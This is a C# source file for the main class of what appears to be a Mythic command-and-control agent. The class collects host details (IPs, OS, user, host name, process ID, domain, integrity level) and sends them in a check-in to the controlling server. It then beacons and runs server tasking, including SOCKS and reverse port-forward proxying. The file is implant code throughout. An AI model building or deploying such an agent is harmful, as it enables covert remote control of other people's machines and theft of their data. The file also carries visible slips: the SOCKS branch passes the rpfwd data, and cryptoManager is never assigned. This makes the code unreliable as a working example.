﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Diagnostics;
using System.Net;

namespace Agent
{
    public class Agent : IAgent
    {
        private IAgentConfig config { get; set; }
        private IEnumerable<IProfile> profiles { get; set; }
        private ILogger logger { get; set; }
        private ITaskManager taskManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IProfile _profile = null;
        private ICryptoManager cryptoManager { get; set; }

        //Will need ISocksManager, IRpfwdManager, IForwarderManager
        public Agent(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager, ICryptoManager cryptoManager)
        {
            this.profiles = profiles;
            this.taskManager = taskManager;
            this.logger = logger;
            this.config = config;
            this.tokenManager = tokenManager;

            _profile = SelectProfile(99);
            _profile.SetTaskingReceived += OnTaskingReceived;
        }
        public async Task Start()
        {
            await this.CheckIn();
            await this._profile.StartBeacon();
        }
        private IProfile SelectProfile(int index)
        {
            if (index == 99) //Default Value
            {
                Random random = new Random();

                return profiles.ElementAt(random.Next(profiles.Count()));
            }

            return profiles.ElementAt(index);
        }

        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<bool> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ips = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Select(a => a.ToString()).ToArray(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id,
                uuid = this.config.uuid,
                architecture = await Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = tokenManager.getIntegrity(),
            };

            try
            {
                CheckinResponse res = await _profile.Checkin(ct);

                if (res is null || res.status != "success")
                {
                    logger.Log("Returning False.");
                    return false;
                }

                this.updateAgentInfo(res);

                return true;

            }
            catch (Exception e)
            {
                logger.Log(e.ToString());
                return false;
            }
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        private void updateAgentInfo(CheckinResponse res)
        {
            this.config.uuid = res.id;
        }

        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
        {
            if(args.tasking_response is null)
            {
                return;
            }

            args.tasking_response.tasks.ForEach(task => this.taskManager.StartTaskAsync(new ServerJob(task)));

            if (args.tasking_response.socks is not null)
            {
                this.taskManager.HandleProxyResponses("socks", args.tasking_response.rpfwd);
            }

            if (args.tasking_response.rpfwd is not null)
            {
                this.taskManager.HandleProxyResponses("rpfwd", args.tasking_response.rpfwd);
            }

            if (args.tasking_response.delegates is not null)
            {
                this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
            }

            if(args.tasking_response.responses is not null)
            {
                this.taskManager.HandleServerResponses(args.tasking_response.responses);
            }
        }
    }
}